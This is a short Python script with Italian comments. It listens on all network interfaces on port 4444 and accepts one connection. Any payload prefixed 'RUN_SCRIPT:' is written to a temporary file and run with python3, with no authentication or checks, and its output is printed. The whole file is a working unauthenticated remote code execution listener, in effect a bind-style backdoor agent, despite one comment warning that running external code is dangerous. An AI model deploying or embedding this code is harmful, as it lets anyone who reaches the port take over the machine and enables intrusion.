import socket              # Comunicazione TCP/IP tra client e server
import subprocess         # Permette di eseguire processi esterni (script Python ricevuti)
import tempfile           # Creazione sicura di file temporanei
import os                 # Operazioni sul filesystem (es. rimozione file)

# Client in ascolto su tutte le interfacce di rete
# 0.0.0.0 = accetta connessioni da qualsiasi IP locale
IP = "0.0.0.0"

# Porta su cui il server invia comandi
PORT = 4444


def main():
    # NOTE: questo programma agisce come "client esecutore"
    # riceve codice Python da un server e lo esegue localmente

    # Creazione socket TCP (IPv4, connessione affidabile)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Associa IP e porta al socket
    sock.bind((IP, PORT))

    # Mette il client in ascolto per connessioni in ingresso
    sock.listen(1)

    print("[CLIENT] In attesa comando...")

    # Attesa bloccante di una connessione dal server
    conn, addr = sock.accept()

    # Ricezione del messaggio (payload del server)
    data = conn.recv(4096).decode()

    # Controllo protocollo: esegui solo se arriva un comando valido
    if data.startswith("RUN_SCRIPT:"):

        # Estrae lo script rimuovendo il prefisso del protocollo
        script = data.replace("RUN_SCRIPT:", "", 1)

        # Scrive lo script in un file temporaneo .py
        # (serve per poterlo eseguire come processo separato)
        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as f:
            f.write(script.encode())
            path = f.name

        print(f"[CLIENT] Eseguo script ricevuto: {path}")

        # ATTENZIONE: esecuzione di codice esterno (potenzialmente pericoloso)
        result = subprocess.run(
            ["python3", path],
            capture_output=True,
            text=True
        )

        # Output dello script eseguito
        print("[OUTPUT STDOUT]")
        print(result.stdout)

        # Errori eventuali
        print("[OUTPUT STDERR]")
        print(result.stderr)

        # Pulizia: rimozione file temporaneo
        os.remove(path)

    # Chiusura connessione client-server
    conn.close()
    sock.close()


# Avvio del programma
main()